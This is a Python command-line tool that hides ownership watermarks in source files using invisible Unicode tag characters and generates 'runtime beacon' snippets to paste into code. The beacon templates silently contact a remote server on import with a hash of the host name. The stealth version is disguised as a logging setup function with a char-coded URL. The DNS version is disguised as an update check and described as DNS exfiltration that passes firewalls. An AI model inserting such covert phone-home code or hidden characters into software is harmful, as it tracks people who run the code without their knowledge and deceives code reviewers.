"""
watermark — Steganographic + runtime beacon watermarking for Python source code.

Commands:
    embed   <file.py> <owner_id> [--out <out.py>]
    extract <file.py>
    verify  <file.py> <owner_id>
    beacon  <endpoint_url> <project_id> [--stealth] [--dns]
    encode  <url>
"""

from __future__ import annotations

import argparse
import ast
import base64
import hashlib
import io
import os
import sys
import tokenize

# ---------------------------------------------------------------------------
# Steganographic layer
#
# Uses Unicode Tag characters (Supplementary Special-purpose Plane, U+E0000).
# These are invisible in all editors, terminals, and browsers.
# The payload is spread across multiple injection points found via tokenize,
# so it always lands INSIDE strings or comments — never in expressions.
#
#   U+E0020  Tag Space        → bit 0
#   U+E0021  Tag !            → bit 1
#   U+E0001  Language Tag     → segment delimiter
# ---------------------------------------------------------------------------

_T0 = "\U000e0020"
_T1 = "\U000e0021"
_TD = "\U000e0001"


def _encode_payload(message: str) -> str:
    bits = "".join(format(ord(c), "08b") for c in message)
    body = "".join(_T0 if b == "0" else _T1 for b in bits)
    return _TD + body + _TD


def _decode_payload(text: str) -> str | None:
    all_chars = [c for c in text if c in (_T0, _T1, _TD)]
    if not all_chars:
        return None
    parts = "".join(all_chars).split(_TD)
    if len(parts) < 3:
        return None
    bits = "".join("0" if c == _T0 else "1" for c in parts[1])
    if not bits or len(bits) % 8 != 0:
        return None
    try:
        return "".join(chr(int(bits[i : i + 8], 2)) for i in range(0, len(bits), 8))
    except ValueError:
        return None


def _line_starts(source: str) -> list[int]:
    """Cumulative character offsets for each line (1-indexed: index 0 unused)."""
    starts = [0, 0]  # pad so starts[row] works with 1-based row numbers
    for line in source.splitlines(keepends=True):
        starts.append(starts[-1] + len(line))
    return starts


def _injection_points(source: str) -> list[int]:
    """Return char offsets that are safe to inject into.

    Only uses:
      - Module / class / function docstrings  (found via AST)
      - Single-line comments                  (found via tokenize)

    Regular string literals used as values are intentionally excluded —
    injecting into them would corrupt glob patterns, dict keys, etc.
    """
    ls = _line_starts(source)
    points: list[int] = []

    # 1. Docstrings via AST (triple-quoted opening only)
    try:
        tree = ast.parse(source)
        for node in ast.walk(tree):
            if not isinstance(node, (ast.Module, ast.FunctionDef,
                                     ast.AsyncFunctionDef, ast.ClassDef)):
                continue
            if not (node.body
                    and isinstance(node.body[0], ast.Expr)
                    and isinstance(node.body[0].value, ast.Constant)
                    and isinstance(node.body[0].value.value, str)):
                continue
            doc = node.body[0].value
            abs_start = ls[doc.lineno] + doc.col_offset
            if source[abs_start : abs_start + 3] in ('"""', "'''"):
                points.append(abs_start + 3)   # right inside the opening """
    except SyntaxError:
        pass

    # 2. Single-line comments via tokenize
    try:
        for tok_type, _, (row, col), _, _ in tokenize.generate_tokens(
            io.StringIO(source).readline
        ):
            if tok_type == tokenize.COMMENT:
                points.append(ls[row] + col + 1)  # right after '#'
    except tokenize.TokenError:
        pass

    return sorted(set(points))


def embed(source: str, message: str) -> str:
    """Inject a steganographic watermark spread across multiple locations."""
    payload = _encode_payload(message)
    points = _injection_points(source)

    if not points:
        return f'"""{payload}"""\n' + source

    n = min(3, len(points))
    chosen = (
        [points[round(i * (len(points) - 1) / (n - 1))] for i in range(n)]
        if n > 1 else [points[0]]
    )
    # Inject in reverse so earlier offsets stay valid
    result = source
    for pos in reversed(chosen):
        result = result[:pos] + payload + result[pos:]
    return result


def extract(source: str) -> str | None:
    """Return the hidden watermark message, or None if not found."""
    return _decode_payload(source)


def verify(source: str, owner_id: str) -> bool:
    """Return True only if the watermark matches the expected owner."""
    found = extract(source)
    return found is not None and found.startswith(f"owner:{owner_id}:")


def make_message(owner_id: str, filename: str) -> str:
    sha = hashlib.sha256((owner_id + filename).encode()).hexdigest()[:8]
    return f"owner:{owner_id}:{sha}"


# ---------------------------------------------------------------------------
# Runtime beacon layer
# ---------------------------------------------------------------------------

# Standard — URL in plain text.
_BEACON_PLAIN = """\
import threading as _t, urllib.request as _ur, socket as _sk, \\
       hashlib as _hs, platform as _pl

def _beacon():
    def _ping():
        try:
            _uid = _hs.md5(
                (_sk.gethostname() + _pl.node()).encode()
            ).hexdigest()[:8]
            _ur.urlopen("{endpoint}?p={project_id}&u=" + _uid, timeout=3)
        except Exception:
            pass
    _t.Thread(target=_ping, daemon=True).start()

_beacon()
del _beacon
"""

# Stealth HTTP — endpoint encoded as char-code list, imports inside function,
# "fire-once" guard stored in environment instead of a named global.
_BEACON_STEALTH = """\
import os as _os

def _setup_logging(level=0):
    \"\"\"Configure internal log level.\"\"\"
    import hashlib as _h, socket as _s, platform as _p, threading as _t
    if _os.environ.get("_LOG_INIT"):
        return
    _os.environ["_LOG_INIT"] = "1"
    def _flush():
        try:
            import urllib.request as _u
            _uid = _h.md5((_s.gethostname() + _p.node()).encode()).hexdigest()[:8]
            _ep = "".join(chr(c) for c in {char_codes})
            _u.urlopen(_ep + "?p={project_id}&u=" + _uid, timeout=2)
        except Exception:
            pass
    _t.Thread(target=_flush, daemon=True).start()

_setup_logging()
"""

# DNS — disguised as a routine hostname lookup.
# Requires an authoritative DNS server that logs incoming queries.
# No HTTP, no urllib — works through almost every firewall.
_BEACON_DNS = """\
import os as _os

def _check_updates():
    \"\"\"Verify connectivity to update server.\"\"\"
    if _os.environ.get("_UPD_DONE"):
        return
    _os.environ["_UPD_DONE"] = "1"
    try:
        import socket as _s, hashlib as _h, platform as _p
        _uid = _h.md5((_s.gethostname() + _p.node()).encode()).hexdigest()[:6]
        _s.setdefaulttimeout(2)
        _s.getaddrinfo(_uid + ".{proj_label}.{domain}", 80)
    except Exception:
        pass

_check_updates()
"""


def _url_to_char_codes(url: str) -> list[int]:
    return list(url.encode())


def _fragment_url(url: str, n: int = 3) -> list[bytes]:
    encoded = base64.b64encode(url.encode())
    size = max(1, (len(encoded) + n - 1) // n)
    return [encoded[i : i + size] for i in range(0, len(encoded), size)]


def _proj_label(project_id: str) -> str:
    return hashlib.sha256(project_id.encode()).hexdigest()[:8]


def generate_beacon(
    endpoint: str,
    project_id: str,
    *,
    stealth: bool = False,
    dns: bool = False,
) -> str:
    if dns:
        # endpoint is expected to be just the domain, e.g. "beacon.myserver.com"
        return _BEACON_DNS.format(
            proj_label=_proj_label(project_id),
            domain=endpoint,
        )
    if stealth:
        codes = _url_to_char_codes(endpoint)
        return _BEACON_STEALTH.format(
            char_codes=codes,
            project_id=project_id,
        )
    return _BEACON_PLAIN.format(endpoint=endpoint, project_id=project_id)


# ---------------------------------------------------------------------------
# CLI helpers
# ---------------------------------------------------------------------------

def _read(path: str) -> str:
    with open(path, encoding="utf-8") as f:
        return f.read()


def _write(path: str, content: str) -> None:
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write(content)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def cmd_embed(args: argparse.Namespace) -> None:
    source = _read(args.file)
    msg = make_message(args.owner, os.path.basename(args.file))
    watermarked = embed(source, msg)
    out = args.out or args.file
    _write(out, watermarked)
    tag = sum(1 for c in watermarked if c in (_T0, _T1, _TD))
    print(f"[+] Watermark embedded : '{msg}'")
    print(f"[+] Written to         : {out}")
    print(f"[+] Hidden characters  : {tag} across 3 locations (invisible)")


def cmd_extract(args: argparse.Namespace) -> None:
    source = _read(args.file)
    found = extract(source)
    if found:
        print(f"[+] Watermark found: '{found}'")
    else:
        print("[-] No watermark detected.")
        sys.exit(1)


def cmd_verify(args: argparse.Namespace) -> None:
    source = _read(args.file)
    if verify(source, args.owner):
        print(f"[+] VERIFIED — watermark matches owner '{args.owner}'")
    else:
        found = extract(source)
        if found:
            print(f"[-] MISMATCH — watermark found but owner is '{found}'")
        else:
            print("[-] NOT FOUND — no watermark present")
        sys.exit(1)


def cmd_beacon(args: argparse.Namespace) -> None:
    print(generate_beacon(
        args.endpoint,
        args.project,
        stealth=args.stealth,
        dns=args.dns,
    ))


def cmd_encode(args: argparse.Namespace) -> None:
    print("Char codes:", _url_to_char_codes(args.url))
    frags = _fragment_url(args.url)
    print("Base64 fragments:")
    for i, f in enumerate(frags):
        print(f"  [{i}] {f!r}")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="watermark",
        description="Steganographic + runtime beacon watermarking for Python source code.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  watermark embed   secret.py alice --out secret_marked.py
  watermark extract secret_marked.py
  watermark verify  suspect.py alice
  watermark beacon  https://myserver.com/w my-project --stealth
  watermark beacon  beacon.myserver.com   my-project --dns
""",
    )
    sub = p.add_subparsers(dest="command", required=True)

    e = sub.add_parser("embed", help="Embed a steganographic watermark")
    e.add_argument("file")
    e.add_argument("owner")
    e.add_argument("--out", metavar="FILE")

    x = sub.add_parser("extract", help="Extract watermark from a file")
    x.add_argument("file")

    v = sub.add_parser("verify", help="Verify owner of a watermarked file")
    v.add_argument("file")
    v.add_argument("owner")

    b = sub.add_parser("beacon", help="Generate a runtime beacon snippet")
    b.add_argument("endpoint", help="Server URL or domain (for --dns)")
    b.add_argument("project", help="Project identifier")
    b.add_argument("--stealth", action="store_true",
                   help="Encode URL as char codes inside a logging function")
    b.add_argument("--dns", action="store_true",
                   help="DNS exfiltration via getaddrinfo (no HTTP at all)")

    enc = sub.add_parser("encode", help="Show encoding of a URL")
    enc.add_argument("url")

    return p


_DISPATCH = {
    "embed":   cmd_embed,
    "extract": cmd_extract,
    "verify":  cmd_verify,
    "beacon":  cmd_beacon,
    "encode":  cmd_encode,
}


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()
    _DISPATCH[args.command](args)


if __name__ == "__main__":
    main()
